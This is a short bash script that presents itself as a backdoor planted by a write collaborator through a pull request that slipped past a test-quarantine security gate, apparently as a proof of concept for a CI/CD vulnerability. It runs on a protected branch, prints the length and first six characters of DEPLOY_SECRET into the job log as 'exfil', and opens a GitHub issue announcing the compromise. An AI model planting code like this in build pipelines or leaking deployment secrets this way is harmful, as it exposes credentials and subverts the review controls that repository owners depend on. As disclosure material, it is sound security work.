#!/usr/bin/env bash
set -e
# BACKDOOR injected by attacker (write collaborator) via a quarantine-bypassed PR
echo "deploy: app running on protected branch f7main"
echo "PWNED: attacker-controlled code is executing on the protected branch"
echo "exfil: DEPLOY_SECRET length=${#DEPLOY_SECRET} prefix=${DEPLOY_SECRET:0:6}"
gh issue create --repo "$GITHUB_REPOSITORY" --title "PWNED-f7main-via-quarantine-bypass" --body "Attacker code executed on protected branch f7main after the required security gate was bypassed by test quarantine. DEPLOY_SECRET length=${#DEPLOY_SECRET}." 2>&1 | head -2 || echo "issue create attempted"
